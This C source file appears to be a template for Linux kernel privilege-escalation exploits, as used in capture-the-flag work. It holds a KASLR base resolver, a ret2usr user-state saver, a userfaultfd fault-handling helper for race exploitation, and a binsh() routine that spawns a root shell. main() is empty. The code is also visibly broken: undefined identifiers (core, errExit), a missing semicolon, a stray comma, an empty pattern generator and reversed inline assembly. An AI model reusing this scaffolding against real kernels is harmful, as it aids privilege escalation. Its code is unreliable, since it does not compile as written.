#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <poll.h>
#include <sys/poll.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <pthread.h>
#include <signal.h>
#include <errno.h>
#include <linux/userfaultfd.h>

__attribute__((format(printf, 1, 2)))
static void dbg(const char *fmt, ...)
{
  va_list args;
  va_start(args, fmt);
  vfprintf(stderr, fmt, args);
  va_end(args);
  fflush(stderr);
  getchar();
}

_Noreturn static void fatal(const char *fmt, ...)
{
  char buf[0x400] = {'\0'};
  int saved_errno = errno;
  va_list args;
  va_start(args, fmt);
  vsnprintf(buf, sizeof(buf), fmt, args);
  va_end(args);

  buf[sizeof(buf) - 1] = '\0';
  errno = saved_errno;
  perror(fmt);
  exit(EXIT_FAILURE);
  __builtin_unreachable();
}

static void bind_core(int cpu)
{
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  if (sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set) < 0)
    fatal("sched_setaffinity");
  printf("[+] cpu bind #%d\n", cpu);
  return ;
}

/*
    debruiji pattern generator/offset finder
    ref:
      https://gist.github.com/crowell/77b601db16562ac49834  
*/
static const char *charset = "0123456789abcdefghijklmnopqrstuvwxyz"
static void pattern_create(char *buf, size_t length) {
    
}

/* kernel address resolver */
// kernel base (text) without KASLR
#define KBASE 0xffffffff81000000ul 
unsigned long kern_base = KBASE; 
unsigned long kern_heap = 0ul,

#define DCL(x) ((x) - KBASE)
#define ADR(x) ((x) + kern_base) 

#define PAGESIZE 0x1000
#define NPAGES(n) ((PAGESIZE) * (n))

/* other userful defined CONSTANT */
#define TTY_MAGIC 0x5401u     // paranoia check
#define TTY_DEAD  0xdeaddeadu 

/* Debug */
void ddhv(unsigned long *addr, const size_t qword_num){
  for (size_t i = 0; i < qword_num - 1; i += 2) {
    unsigned long v1 = (unsigned long)addr[i];
    unsigned long v2 = (unsigned long)addr[i + 1];
    printf("[+%02lx]: 0x%016lx 0x%016lx\n", i , v1, v2);
  }
}

void ddh(unsigned long *addr, const size_t qword_num){
  for (size_t i = 0; i < qword_num - 1; i+=2){
    unsigned long v1 = (unsigned long)addr[i];
    unsigned long v2 = (unsigned long)addr[i + 1];
    if (v1 == 0ul && v2 == 0ul)
      continue;
    printf("[+%02lx]: 0x%016lx 0x%016lx\n", i , v1, v2);
  }
}

/* where be landed finally */
void binsh(){
  uid_t uid = getuid();
  if(uid == 0){
    puts("[*] Got Root !");
    system("/bin/sh");
    while(1);
  }else{
    fputs("[!] UID: %d, Failed get root\n", stderr);
  }
}

/*  ret2usr  */
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;
void save_state(){
  puts("[*] save user state...");
  __asm__(
    ".intel_syntax noprefix;"
    "mov user_cs, cs;"
    "mov user_ss, ss;"
    "mov user_sp, rsp;"
    "pushf;"
    "pop user_rflags;"
    ".att_syntax;"
  );
  printf("[+] cs: 0x%lx ss: 0x%lx rsp: 0x%lx, rflags: 0x%lx\n", user_cs, user_ss, user_sp, user_rflags);
}


/* userfaultfd */
struct uffd_ctx {
    long uffd;
    unsigned long addr;
    size_t page_num;
    char *ptr;
    void (*handler)(void *);
    pthread_t th;
};

static struct uffd_ctx* setup_uffd(unsigned long addr, size_t pg_num, char *cpy_src, void (*callback)(void *)){
    int stat;
    struct uffdio_api api = { .api = UFFD_API, .features = 0 };
    struct uffdio_register reg;
    struct uffd_ctx *ctx = NULL; 
    
    if(addr&(PAGESIZE - 1))
        errExit("addr is not page bound");

    ctx = calloc(sizeof(struct uffd_ctx), 1);
    if(!ctx)
        errExit("create context");
    
    ctx->uffd = syscall(__NR_userfaultfd, O_NONBLOCK | O_CLOEXEC);
    if(!ctx->uffd)
        errExit("syscall userfautlfd");
    
    stat = ioctl(ctx->uffd, UFFDIO_API, &api);
    if(stat < 0)
        errExit("ioctl(userfaultfd(UFFDIO_API)");
   
    printf("[+] mmap => 0x%lx\n", addr);
    ctx->addr = (unsigned long)mmap((void *)addr, NPAGES(pg_num), PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0); 
    if(ctx->addr == (unsigned long)MAP_FAILED || ctx->addr != addr)
        errExit("mmap");
    
    ctx->page_num = pg_num;
    
    /* register */
    reg.mode = UFFDIO_REGISTER_MODE_MISSING;
    reg.range.start = addr;
    reg.range.len   = NPAGES(pg_num); 
    stat = ioctl(ctx->uffd, UFFDIO_REGISTER, &reg);
    if(stat < 0)
        errExit("ioctl(userfaultfd(UFFDIO_REGSITER)");

    ctx->ptr      = cpy_src;
    ctx->handler  = (void (*)(void *))callback; 
    return ctx;
}

static void *monitor_uffd(void *arg){
    struct pollfd evt; 
    struct uffd_msg msg;
    struct uffdio_copy cp;
    struct uffd_ctx *ctx = (struct uffd_ctx *)arg;
    if(!ctx)
        errExit("userfaultfd ctx is null");

    evt.fd = ctx->uffd;
    evt.events = POLLIN;
    puts("[*] start polling");
    while(poll(&evt, 1, -1) > 0){
        ssize_t nbytes;
        void *faulted = NULL;
        if(evt.revents&POLLERR ||evt.revents&POLLHUP)
            errExit("poll");
       
        nbytes = read(ctx->uffd, &msg, sizeof(msg));
        if(nbytes < 0 || nbytes != sizeof(msg))
            errExit("read event");

        if(msg.event != UFFD_EVENT_PAGEFAULT)
            errExit("unlikely pagefault");
        
        faulted = (void *)msg.arg.pagefault.address;
        if(faulted != (void *)ctx->addr)
            errExit("Hmm, pagefaulted but, at unexptected address...");

        printf("[+] faulted @ %p\n", (void *)ctx->addr);   
        ctx->handler(faulted);
        puts("[*] handler called");
        /* post-handler */
        cp.mode = 0;     
        cp.src = (unsigned long)ctx->ptr;
        cp.dst = (unsigned long)faulted;
        cp.len = NPAGES(ctx->page_num);
        if(ioctl(ctx->uffd, UFFDIO_COPY, &cp) < 0)
            errExit("ioctl(UFFDIO_COPY)");

        break; 
    } 
    puts("exit uffd_fault_monitor");
}

void dispatch_uffd_monitor(struct uffd_ctx *ctx, const char *name){
    int stat = pthread_create(&ctx->th, NULL, monitor_uffd, (void *)ctx);
    if(stat < 0){
        errno = stat;
        errExit("pthread_create");
    }
    printf("[+] start thread %s\n", name);
}

unsigned long get_rax(void){
    unsigned long ret;
    __asm__(
        "movq %0, %%rax;"
        :"=r"(ret)::
    );
    return ret; 
}

int gfd; // target device 


__attribute__((constructor)) 
void setup(){
  setvbuf(stdin,  NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
}

int main(int argc, char **argv){
    return 0;
}
